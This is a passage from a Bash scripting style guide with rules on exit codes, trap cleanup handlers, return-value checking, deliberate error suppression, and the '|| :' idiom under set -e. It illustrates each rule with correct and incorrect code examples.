if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Anti-patterns:**

```bash
# ✗ Script exits on command substitution failure before conditional check
result=$(failing_command)  # Exits here with set -e
if [[ -n "$result" ]]; then  # Never reached
  echo "Never gets here"
fi

# ✓ Disable errexit for command
set +e
result=$(failing_command)
set -e

# ✓ Check in conditional
if result=$(failing_command); then
  echo "Command succeeded: $result"
else
  echo "Command failed, that's okay"
fi
```

**Edge cases:** Disable for interactive scripts with recoverable user errors, scripts trying multiple approaches, or cleanup operations that might fail. Re-enable immediately after.


---


**Rule: BCS0602**

## Exit Codes

**Standard implementation:**
```bash
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
die 0                    # Success
die 1 'General error'    # General error
die 2 'Missing argument' # Usage error
die 22 'Invalid option'  # Invalid argument (EINVAL)
```

**Standard exit codes:**

| Code | Meaning | When to Use |
|------|---------|-------------|
| 0 | Success | Command completed successfully |
| 1 | General error | Catchall for general errors |
| 2 | Misuse of shell builtin | Missing keyword/command, argument errors |
| 22 | Invalid argument | Invalid option provided (EINVAL errno) |
| 126 | Command cannot execute | Permission problem or not executable |
| 127 | Command not found | Possible typo or PATH issue |
| 128+n | Fatal error signal n | e.g., 130 = Ctrl+C (128+SIGINT) |
| 255 | Exit status out of range | Use 0-255 only |

**Rationale:**
- **0 = success**: Universal Unix/Linux convention
- **1 = general error**: Safe catchall when specific code doesn't matter
- **2 = usage error**: Matches bash built-in behavior for argument/usage errors
- **22 = EINVAL**: Standard errno for "Invalid argument" - use for bad options/parameters
- **Use 1-125 for custom codes**: Avoids signal conflicts (128+)

**Define constants for readability:**
```bash
readonly -i SUCCESS=0 ERR_GENERAL=1 ERR_USAGE=2 ERR_CONFIG=3 ERR_NETWORK=4

die "$ERR_CONFIG" 'Failed to load configuration file'
```

**Checking exit codes:**
```bash
if command; then
  echo "Success"
else
  exit_code=$?
  case $exit_code in
    1) echo "General failure" ;;
    2) echo "Usage error" ;;
    *) echo "Unknown error: $exit_code" ;;
  esac
fi
```

**Common custom codes:**
```bash
die 0 'Success message'         # Success (informational)
die 1 'Generic failure'         # General failure
die 2 'Missing required file'   # Usage error
die 3 'Configuration error'     # Config file issue
die 4 'Network error'           # Connection failed
die 5 'Permission denied'       # Insufficient permissions
die 22 "Invalid option '$1'"    # Bad argument (EINVAL)
```


---


**Rule: BCS0603**

## Trap Handling

**Standard cleanup pattern:**

```bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir"
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile"

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Rationale:** Ensures resources (temp files, locks, processes) are cleaned regardless of exit path (normal, error, Ctrl+C, kill). Preserves original exit code. Prevents partial state corruption.

**Trap signals:**

| Signal | Triggered By |
|--------|--------------|
| `EXIT` | Any script exit (normal or error) |
| `SIGINT` | Ctrl+C |
| `SIGTERM` | `kill` command |
| `ERR` | Command failure with `set -e` |

**Common patterns:**

**Temp file cleanup:**
```bash
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo "data" > "$temp_file"
# Cleanup automatic on exit
```

**Temp directory cleanup:**
```bash
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
extract_archive "$archive" "$temp_dir"
```

**Lockfile cleanup:**
```bash
lockfile="/var/lock/myapp.lock"

acquire_lock() {
  if [[ -f "$lockfile" ]]; then
    die 1 "Already running (lock file exists: $lockfile)"
  fi
  echo $$ > "$lockfile" || die 1 'Failed to create lock file'
  trap 'rm -f "$lockfile"' EXIT
}

acquire_lock
```

**Process cleanup:**
```bash
long_running_command &
bg_pid=$!
trap 'kill $bg_pid 2>/dev/null' EXIT
```

**Comprehensive cleanup:**
```bash
#!/usr/bin/env bash
set -euo pipefail

declare -- temp_dir=''
declare -- lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}

  trap - SIGINT SIGTERM EXIT

  ((bg_pid > 0)) && kill "$bg_pid" 2>/dev/null

  if [[ -n "$temp_dir" && -d "$temp_dir" ]]; then
    rm -rf "$temp_dir" || warn "Failed to remove temp directory: $temp_dir"
  fi

  if [[ -n "$lockfile" && -f "$lockfile" ]]; then
    rm -f "$lockfile" || warn "Failed to remove lockfile: $lockfile"
  fi

  ((exitcode == 0)) && info 'Script completed successfully' || error "Script exited with error code: $exitcode"

  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT

temp_dir=$(mktemp -d)
lockfile="/var/lock/myapp-$$.lock"
echo $$ > "$lockfile"

monitor_process &
bg_pid=$!

main "$@"
```

**Multiple trap handlers:**
```bash
#  Wrong - second trap REPLACES first
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT

#  Correct - combine in one trap
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT

#  Or use cleanup function
trap 'cleanup' EXIT
```

**Execution order:** On Ctrl+C: SIGINT handler runs, then EXIT handler runs, then script exits.

**Disabling traps:**
```bash
trap - EXIT
trap - SIGINT SIGTERM

# Disable during critical section
trap - SIGINT
perform_critical_operation
trap 'cleanup $?' SIGINT
```

**Critical best practices:**

**1. Prevent recursion:**
```bash
cleanup() {
  #  Disable trap first - prevents infinite recursion if cleanup fails
  trap - SIGINT SIGTERM EXIT
  rm -rf "$temp_dir"
  exit "$exitcode"
}
```

**2. Preserve exit code:**
```bash
#  Correct - capture $? immediately
trap 'cleanup $?' EXIT

#  Wrong - $? may change between trigger and handler
trap 'cleanup' EXIT
```

**3. Quote trap commands:**
```bash
#  Correct - single quotes delay variable expansion
trap 'rm -f "$temp_file"' EXIT

#  Wrong - double quotes expand now, not on trap execution
temp_file="/tmp/foo"
trap "rm -f $temp_file" EXIT  # Expands to: trap 'rm -f /tmp/foo' EXIT
temp_file="/tmp/bar"  # Trap still removes /tmp/foo!
```

**4. Set trap early:**
```bash
#  Correct - trap before resource creation
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

#  Wrong - resource leak if script exits between lines
temp_file=$(mktemp)
trap 'cleanup $?' EXIT
```

**Anti-patterns:**

```bash
#  Wrong - loses exit code
trap 'rm -f "$temp_file"; exit 0' EXIT

#  Correct
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

#  Wrong - missing function call syntax
trap cleanup EXIT

#  Correct
trap 'cleanup $?' EXIT

#  Wrong - complex inline logic
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

#  Correct - use function
cleanup() {
  rm -f "$file1" "$file2"
  kill "$pid" 2>/dev/null
  rm -rf "$dir"
}
trap 'cleanup' EXIT
```

**Testing:**
```bash
#!/usr/bin/env bash
set -euo pipefail

cleanup() {
  echo "Cleanup called with exit code: ${1:-?}"
  trap - EXIT
  exit "${1:-0}"
}

trap 'cleanup $?' EXIT

echo "Normal operation..."
# Test: Ctrl+C, error (false), normal exit
```

**Summary:** Always use cleanup function for non-trivial cleanup. Disable trap inside cleanup to prevent recursion. Set trap early before creating resources. Preserve exit code with `trap 'cleanup $?' EXIT`. Use single quotes to delay expansion. Test with normal exit, errors, and signals.


---


**Rule: BCS0604**

## Checking Return Values

**Always check return values of commands and function calls with informative error messages. While `set -e` helps, explicit checking provides better control over error handling and messaging.**

**Rationale:**
- **Better Error Messages**: Explicit checks allow contextual error messages
- **Controlled Recovery**: Some failures need cleanup or fallback logic, not immediate exit
- **`set -e` Limitations**: Doesn't catch pipeline failures (except last command), command substitution in assignments, or commands in conditionals
- **Partial Failure Handling**: Some operations continue after non-critical failures

**When `set -e` is insufficient:**

```bash
# set -e doesn't catch these:

# 1. Non-final pipeline commands
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails!

# 2. Commands in conditionals
if command_that_fails; then
  echo "This runs even though command failed"
fi

# 3. Command substitution in assignments
output=$(failing_command)  # Doesn't exit!
```

**Basic checking patterns:**

**Pattern 1: Explicit if check (most informative)**

```bash
#  Best for critical operations needing context
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move $source_file to $dest_dir"
  error "Check permissions and disk space"
  exit 1
fi
```

**Pattern 2: || with die (concise)**

```bash
#  Good for simple cases
mv "$source_file" "$dest_dir/" || die 1 "Failed to move $source_file"
cp "$config" "$backup" || die 1 "Failed to backup $config to $backup"
```

**Pattern 3: || with command group (for cleanup)**

```bash
#  Good when failure requires cleanup
mv "$temp_file" "$final_location" || {
  error "Failed to move $temp_file to $final_location"
  rm -f "$temp_file"
  exit 1
}

process_file "$input" || {
  error "Processing failed: $input"
  restore_backup
  cleanup_temp_files
  return 1
}
```

**Pattern 4: Capture and check return code**

```bash
#  When you need the return code value
local -i exit_code
command_that_might_fail
exit_code=$?

if ((exit_code != 0)); then
  error "Command failed with exit code $exit_code"
  return "$exit_code"
fi

#  Different actions for different exit codes
wget "$url"
case $? in
  0) success "Download complete" ;;
  1) die 1 "Generic error" ;;
  2) die 2 "Parse error" ;;
  3) die 3 "File I/O error" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error code: $?" ;;
esac
```

**Pattern 5: Function return value checking**

```bash
# Define function with meaningful return codes
validate_file() {
  local -- file="$1"

  [[ -f "$file" ]] || return 2  # Not found
  [[ -r "$file" ]] || return 5  # Permission denied
  [[ -s "$file" ]] || return 22  # Invalid (empty)

  return 0  # Success
}

# Check function return value
if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config file not found: $config_file" ;;
    5)  die 5 "Cannot read config file: $config_file" ;;
    22) die 22 "Config file is empty: $config_file" ;;
    *)  die 1 "Config validation failed: $config_file" ;;
  esac
fi
```

**Edge case: Pipelines**

```bash
# Problem: set -e only checks last command in pipeline
cat missing_file | grep pattern  # Continues even if cat fails!

#  Solution 1: Use PIPEFAIL (from set -euo pipefail)
set -o pipefail  # Now entire pipeline fails if any command fails
cat missing_file | grep pattern  # Exits if cat fails

#  Solution 2: Check PIPESTATUS array
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then
  die 1 "cat failed"
elif ((PIPESTATUS[1] != 0)); then
  info "No matches found (grep returned non-zero)"
elif ((PIPESTATUS[2] != 0)); then
  die 1 "sort failed"
fi

#  Solution 3: Avoid pipeline, use process substitution
grep pattern < <(cat file1)
```

**Edge case: Command substitution**

```bash
# Problem: Command substitution failure not caught
declare -- output
output=$(failing_command)  # Doesn't exit even with set -e!

#  Solution 1: Check after assignment
output=$(command_that_might_fail) || die 1 "Command failed"

#  Solution 2: Explicit check in separate step
declare -- result
if ! result=$(complex_command arg1 arg2); then
  die 1 "complex_command failed"
fi

#  Solution 3: Use set -e with inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit  # Command substitution inherits set -e
output=$(failing_command)  # NOW exits with set -e
```

**Edge case: Conditional contexts**

```bash
# Commands in if/while/until don't trigger set -e

# Problem: This doesn't exit even with set -e
if some_command; then
  echo "Command succeeded"
else
  echo "Command failed but script continues"
fi

#  Solution: Explicit check after conditional
if some_command; then
  process_result
else
  die 1 "some_command failed"
fi
```

**Complete example with comprehensive error checking:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Messaging functions
error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

info() {
  echo "[$SCRIPT_NAME] $*"
}

# Validate prerequisites
check_prerequisites() {
  local -- cmd
  local -a required_commands=('tar' 'gzip' 'sha256sum')

  info 'Checking prerequisites...'

  for cmd in "${required_commands[@]}"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  info 'Prerequisites check passed'
}

# Create backup with error checking
create_backup() {
  local -- source_dir="$1"
  local -- backup_file="$2"
  local -- temp_file
  local -i exit_code

  info "Creating backup: $source_dir -> $backup_file"

  # Check source exists
  if [[ ! -d "$source_dir" ]]; then
    error "Source directory not found: $source_dir"
    return 2
  fi

  # Check destination writable
  if [[ ! -w "${backup_file%/*}" ]]; then
    error "Cannot write to directory: ${backup_file%/*}"
    return 5
  fi

  # Create backup with error handling
  temp_file="${backup_file}.tmp"

  # Create tar archive
  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error "Failed to create tar archive"
    rm -f "$temp_file"
    return 1
  fi

  # Verify archive
  if ! tar -tzf "$temp_file" >/dev/null; then
    error "Backup verification failed"
    rm -f "$temp_file"
    return 1
  fi

  # Move to final location
  if ! mv "$temp_file" "$backup_file"; then
    error "Failed to move backup to final location"
    rm -f "$temp_file"
    return 1
  fi

  # Create checksum
  if ! sha256sum "$backup_file" > "${backup_file}.sha256"; then
    error "Failed to create checksum"
    # Non-fatal - backup is still valid
    return 0
  fi

  info "Backup created successfully: $backup_file"
  return 0
}

# Process multiple files with return value checking
process_files() {
  local -a files=("$@")
  local -- file
  local -i success_count=0
  local -i fail_count=0

  for file in "${files[@]}"; do
    if create_backup "$file" "/backup/${file##*/}.tar.gz"; then
      ((success_count+=1))
      info "Success: $file"
    else
      ((fail_count+=1))
      error "Failed: $file (return code: $?)"
    fi
  done

  info "Results: $success_count successful, $fail_count failed"

  # Return non-zero if any failures
  ((fail_count == 0))
}

main() {
  check_prerequisites

  local -a source_dirs=('/etc' '/var/log')

  if ! process_files "${source_dirs[@]}"; then
    die 1 "Some backups failed"
  fi

  info "All backups completed successfully"
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
#  Wrong - ignoring return values
mv "$file" "$dest"
#  Correct
mv "$file" "$dest" || die 1 "Failed to move $file to $dest"

#  Wrong - checking $? too late
command1
command2
if (($? != 0)); then  # Checks command2, not command1!
#  Correct - check immediately
command1
if (($? != 0)); then
  die 1 "command1 failed"
fi

#  Wrong - generic error message
mv "$file" "$dest" || die 1 "Move failed"
#  Correct - specific error with context
mv "$file" "$dest" || die 1 "Failed to move $file to $dest"

#  Wrong - not checking command substitution
checksum=$(sha256sum "$file")
#  Correct
checksum=$(sha256sum "$file") || die 1 "Failed to compute checksum for $file"

#  Wrong - not cleaning up after failure
cp "$source" "$dest" || exit 1
#  Correct
cp "$source" "$dest" || {
  rm -f "$dest"
  die 1 "Failed to copy $source to $dest"
}

#  Wrong - assuming set -e catches everything
set -e
output=$(failing_command)  # Doesn't exit!
cat missing_file | grep pattern  # Doesn't exit if cat fails!
#  Correct
set -euo pipefail
shopt -s inherit_errexit
output=$(failing_command) || die 1 "Command failed"
cat file | grep pattern  # Now exits if cat fails (pipefail)
```

**Summary:**
- Always check return values of critical operations
- Use `set -euo pipefail` as baseline plus explicit checks for control
- Provide context in error messages (what failed, with what inputs)
- Check command substitution: `output=$(cmd) || die 1 "cmd failed"`
- Use PIPEFAIL to catch pipeline failures
- Handle different exit codes appropriately (0=success, 1=general, 2=usage)
- Clean up on failure: `|| { cleanup; exit 1; }`
- Test error paths to ensure failures are caught

**Key principle:** Defensive programming assumes operations can fail. Check return values, provide informative errors, handle failures gracefully. Extra error checking prevents hours debugging mysterious failures.


---


**Rule: BCS0605**

## Error Suppression

**Only suppress errors when failure is expected, non-critical, and explicitly safe. Always document WHY. Indiscriminate suppression masks bugs and creates unreliable scripts.**

**Rationale:**

- Masks real bugs and creates silent failures
- Security risk: ignored errors leave systems in insecure states
- Makes debugging impossible when errors are hidden
- False success signals while operations actually failed
- Indicates design problems that should be fixed, not hidden

**Appropriate error suppression:**

**1. Checking command/file existence (expected to fail):**

```bash
#  Failure is expected and non-critical
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
fi

if [[ -f "$optional_config" ]]; then
  source "$optional_config"
fi
```

**2. Cleanup operations (may fail if nothing exists):**

```bash
#  Cleanup may have nothing to do
cleanup_temp_files() {
  rm -f /tmp/myapp_* 2>/dev/null || true
  rmdir /tmp/myapp 2>/dev/null || true
}
```

**3. Optional operations with fallback:**

```bash
#  Have fallback if optional tool unavailable
if command -v md2ansi >/dev/null 2>&1; then
  md2ansi < "$file" || cat "$file"
else
  cat "$file"
fi
```

**4. Idempotent operations:**

```bash
#  Directory/user may already exist
install -d "$target_dir" 2>/dev/null || true
id "$username" >/dev/null 2>&1 || useradd "$username"
```

**Dangerous error suppression:**

**1. File operations (usually critical):**

```bash
#  DANGEROUS - script continues with missing file
cp "$important_config" "$destination" 2>/dev/null || true

#  Correct - fail explicitly
if ! cp "$important_config" "$destination"; then
  die 1 "Failed to copy config to $destination"
fi
```

**2. Data processing (silently loses data):**

```bash
#  DANGEROUS - data loss
process_data < input.txt > output.txt 2>/dev/null || true

#  Correct
if ! process_data < input.txt > output.txt; then
  die 1 'Data processing failed'
fi
```

**3. System configuration (leaves system broken):**

```bash
#  DANGEROUS - service not running but script continues
systemctl start myapp 2>/dev/null || true

#  Correct
systemctl start myapp || die 1 'Failed to start myapp service'
```

**4. Security operations (creates vulnerabilities):**

```bash
#  DANGEROUS - wrong permissions
chmod 600 "$private_key" 2>/dev/null || true

#  Correct - security must succeed
chmod 600 "$private_key" || die 1 "Failed to secure $private_key"
```

**5. Dependency checks (script runs without required tools):**

```bash
#  DANGEROUS - later commands fail mysteriously
command -v git >/dev/null 2>&1 || true

#  Correct - fail early
command -v git >/dev/null 2>&1 || die 1 'git is required'
```

**Error suppression patterns:**

**Pattern 1: Redirect stderr (suppress messages, check return):**

```bash
# Use when error messages are noisy but you check return value
if ! command 2>/dev/null; then
  error "command failed"
fi
```

**Pattern 2: || true (ignore return code):**

```bash
# Make command always succeed
command || true
# Use when failure is acceptable
rm -f /tmp/optional_file || true
```

**Pattern 3: Combined (suppress both):**

```bash
# Use when both messages and return code are irrelevant
rmdir /tmp/maybe_exists 2>/dev/null || true
```

**Pattern 4: Always document WHY:**

```bash
# Suppress errors: temp files may not exist (non-critical)
rm -f /tmp/myapp_* 2>/dev/null || true

# Suppress errors: directory may exist from previous run
install -d "$cache_dir" 2>/dev/null || true
```

**Pattern 5: Conditional suppression:**

```bash
if ((DRY_RUN)); then
  actual_operation 2>/dev/null || true  # Expected to fail
else
  actual_operation || die 1 'Operation failed'  # Must succeed
fi
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- CACHE_DIR="$HOME/.cache/myapp"
declare -- LOG_FILE="$HOME/.local/share/myapp/app.log"

check_optional_tools() {
  #  Safe - tool is optional
  if command -v md2ansi >/dev/null 2>&1; then
    info 'md2ansi available for formatted output'
    declare -g -i HAS_MD2ANSI=1
  else
    info 'md2ansi not found (optional)'
    declare -g -i HAS_MD2ANSI=0
  fi
}

check_required_tools() {
  #  Do NOT suppress - required
  if ! command -v jq >/dev/null 2>&1; then
    die 1 'jq is required but not found'
  fi
}

create_directories() {
  #  Safe - idempotent operation
  install -d "$CACHE_DIR" 2>/dev/null || true
  install -d "${LOG_FILE%/*}" 2>/dev/null || true

  # But verify they exist
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create cache directory: $CACHE_DIR"
  [[ -d "${LOG_FILE%/*}" ]] || die 1 "Failed to create log directory: ${LOG_FILE%/*}"
}

cleanup_old_files() {
  #  Safe - best-effort cleanup
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
  rm -f "$CACHE_DIR"/*.old 2>/dev/null || true
  rmdir "$CACHE_DIR"/temp_* 2>/dev/null || true
}

process_data() {
  local -- input_file="$1"
  local -- output_file="$2"

  #  Do NOT suppress - data processing is critical
  if ! jq '.data' < "$input_file" > "$output_file"; then
    die 1 "Failed to process $input_file"
  fi

  if ! jq empty < "$output_file"; then
    die 1 "Output file is invalid: $output_file"
  fi
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files
  process_data 'input.json' "$CACHE_DIR/output.json"
}

main "$@"

#fin
```

**Critical anti-patterns:**

```bash
#  WRONG - suppressing critical operation
cp "$important_file" "$backup" 2>/dev/null || true
#  Correct
cp "$important_file" "$backup" || die 1 "Failed to create backup"

#  WRONG - no explanation
some_command 2>/dev/null || true
#  Correct - document reason
# Suppress errors: temp directory may not exist (non-critical)
rmdir /tmp/myapp 2>/dev/null || true

#  WRONG - suppressing entire function
process_files() {
  # ... many operations ...
} 2>/dev/null
#  Correct - only suppress specific operations
process_files() {
  critical_operation || die 1 'Critical operation failed'
  optional_cleanup 2>/dev/null || true
}

#  WRONG - using set +e
set +e
critical_operation
set -e
#  Correct - use || true for specific command
critical_operation || {
  error 'Operation failed but continuing'
  true
}

#  WRONG - different handling in production
if [[ "$ENV" == "production" ]]; then
  operation 2>/dev/null || true
else
  operation
fi
#  Correct - same handling everywhere
operation || die 1 'Operation failed'
```

**Summary:**

- Only suppress when failure is expected, non-critical, and safe
- Always document WHY with comment above suppression
- Never suppress critical operations (data, security, dependencies)
- `|| true` ignores return code, `2>/dev/null` suppresses messages, combined suppresses both
- Verify after suppressed operations when possible
- Test without suppression first to ensure correctness

**Key principle:** Error suppression is the exception, not the rule. Every `2>/dev/null` and `|| true` is a deliberate decision that this specific failure is safe to ignore. Document it.


---


**Rule: BCS0606**

## Conditional Declarations with Exit Code Handling

**When using arithmetic conditionals for optional declarations or actions under `set -e`, append `|| :` to prevent false conditions from triggering script exit.**

**Rationale:**

- `(())` returns 0 when true, 1 when false - under `set -euo pipefail`, non-zero returns exit the script
- `|| :` provides safe fallback - colon `:` is a no-op returning 0, the traditional Unix idiom for "ignore this error"
- Conditional execution like `((condition)) && action` should continue when condition is false, not exit

**The core problem:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

#  DANGEROUS: Script exits here if complete=0!
((complete)) && declare -g BLUE=$'\033[0;34m'
# When complete=0:
#   1. (( complete )) returns 1
#   2. && short-circuits, declare never runs
#   3. Overall exit code is 1
#   4. set -e terminates the script!

echo "This line never executes"
```

**The solution:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

#  SAFE: Script continues even when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m' || :
# When complete=0:
#   1. (( complete )) returns 1
#   2. && short-circuits
#   3. || : triggers, returns 0
#   4. Script continues normally

echo "This line executes correctly"
```

**Why `:` over `true`:**

```bash
#  PREFERRED: Colon command
((condition)) && action || :
# - Traditional Unix idiom (Bourne shell)
# - 1 character (concise)
# - Slightly faster (no PATH lookup)

#  ACCEPTABLE: true command
((condition)) && action || true
# - More explicit/readable for beginners
# - 4 characters

# Both are built-ins that return 0; colon is traditional
```

**Common patterns:**

**Pattern 1: Conditional variable declaration**

```bash
declare -i complete=0 verbose=0

# Declare extended variables only in complete mode
((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :

# Print variables only in verbose mode
((verbose)) && declare -p NC RED GREEN YELLOW || :
```

**Pattern 2: Nested conditional declarations**

```bash
if ((color)); then
  declare -g NC=$'\033[0m' RED=$'\033[0;31m'
  ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
else
  declare -g NC='' RED=''
  ((complete)) && declare -g BLUE='' MAGENTA='' || :
fi
```

**Pattern 3: Conditional block execution**

```bash
((verbose)) && {
  declare -p NC RED GREEN
  ((complete)) && declare -p BLUE MAGENTA || :
} || :
```

**Real-world example from color-set.sh:**

```bash
#!/bin/bash
# Dual-purpose script: sourceable library + executable demo

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0

  # Parse arguments to set flags
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose)  verbose=1 ;;
      always)   color=1 ;;
      never)    color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "$FUNCNAME: error: Invalid mode ${1@Q}"
                return 1 ;;
    esac
    shift
  done

  # Auto-detect if color not explicitly set
  ((color== -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; }

  # Declare flag variables only if flags mode active
  if ((flags)); then
    declare -ig VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -g NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m'
    ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' || :
  else
    declare -g NC='' RED='' GREEN=''
    ((complete)) && declare -g BLUE='' MAGENTA='' BOLD='' || :
  fi

  # Print variables only in verbose mode
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE || :
    declare -p NC RED GREEN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT || :
      declare -p BLUE MAGENTA BOLD
    } || :
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: only execute when run directly
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0
#!/bin/bash #semantic
set -euo pipefail

color_set "$@"

#fin
```

**When to use this pattern:**

** Use `|| :` when:**

1. Optional variable declarations based on feature flags
2. Conditional exports for environment variables
3. Feature-gated actions that should be silent when disabled
4. Optional logging or debug output
5. Tier-based variable sets (like basic vs complete colors)

** Don't use when:**

1. **The action must succeed** - use explicit error handling instead
   ```bash
   #  Wrong - suppresses critical errors
   ((required_flag)) && critical_operation || :

   #  Correct - check explicitly
   if ((required_flag)); then
     critical_operation || die 1 "Critical operation failed"
   fi
   ```

2. **You need to know if it failed** - capture the exit code
   ```bash
   #  Wrong - hides failure
   ((condition)) && risky_operation || :

   #  Correct - handle failure
   if ((condition)) && ! risky_operation; then
     error "risky_operation failed"
     return 1
   fi
   ```

**Anti-patterns:**

```bash
#  WRONG: No || :, script exits when condition is false
((complete)) && declare -g BLUE=$'\033[0;34m'

#  WRONG: Double negative, less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'

#  WRONG: Using true instead of : (verbose, less idiomatic)
((complete)) && declare -g BLUE=$'\033[0;34m' || true

#  WRONG: Suppressing critical operations
((user_confirmed)) && delete_all_files || :
# If delete_all_files fails, error is hidden!

#  CORRECT: Check critical operations explicitly
if ((user_confirmed)); then
  delete_all_files || die 1 "Failed to delete files"
fi
```

**Comparison of alternatives:**

```bash
# Alternative 1: if statement (most explicit, best for complex logic)
if ((complete)); then
  declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m'
fi

# Alternative 2: Arithmetic test with || : (concise, safe, preferred for simple cases)
((complete)) && declare -g BLUE=$'\033[0;34m' || :

# Alternative 3: Double-negative pattern (confusing, avoid)
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# Alternative 4: Temporarily disable errexit (never use - disables error checking)
set +e
((complete)) && declare -g BLUE=$'\033[0;34m'
set -e
```

**Testing the pattern:**

```bash
#!/bin/bash
set -euo pipefail

# Test 1: Verify false condition doesn't exit
test_false_condition() {
  local -i flag=0
  ((flag)) && echo "This won't print" || :
  echo "Test 1 passed: false condition didn't exit"
}

# Test 2: Verify true condition executes action
test_true_condition() {
  local -i flag=1
  local -- output=''
  ((flag)) && output="executed" || :
  [[ "$output" == "executed" ]] || {
    echo "Test 2 failed: true condition didn't execute"
    return 1
  }
  echo "Test 2 passed: true condition executed action"
}

# Test 3: Verify nested conditionals
test_nested_conditionals() {
  local -i outer=1 inner=0 executed=0
  ((outer)) && {
    executed=1
    ((inner)) && executed=2 || :
  } || :
  ((executed == 1)) || {
    echo "Test 3 failed: expected executed=1, got $executed"
    return 1
  }
  echo "Test 3 passed: nested conditionals work correctly"
}

# Run tests
test_false_condition
test_true_condition
test_nested_conditionals

echo "All tests passed!"

#fin
```

**Summary:**

- Use `|| :` after `((condition)) && action` to prevent false conditions from triggering `set -e` exit
- Colon `:` is preferred over `true` (traditional shell idiom, concise)
- Only for optional operations - critical operations need explicit error handling
- Test both paths - verify behavior when condition is true and false
- Cross-reference: See BCS0705 (Arithmetic Operations), BCS0805 (Error Suppression), BCS0801 (Exit on Error)

**Key principle:** When you want conditional execution without risking script exit, use `((condition)) && action || :`. This makes your intent explicit: "Do this if condition is true, but don't exit if condition is false."


---


**Rule: BCS0700**

# Input/Output & Messaging

Establishes standardized messaging patterns with color support and proper stream handling. Defines complete messaging suite: `_msg()` (core function using FUNCNAME), `vecho()` (verbose output), `success()`, `warn()`, `info()`, `debug()`, `error()` (unconditional to stderr), `die()` (exit with error), `yn()` (yes/no prompts). Covers STDOUT vs STDERR separation (data vs diagnostics), usage documentation patterns, and when to use messaging functions versus bare echo. Error output must use `>&2` at command beginning.


---


**Rule: BCS0701**

## Standardized Messaging and Color Support

**Color detection pattern** - Check terminal on both stdout and stderr before defining color variables:

```bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0

# Standard color definitions (terminal detection)
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
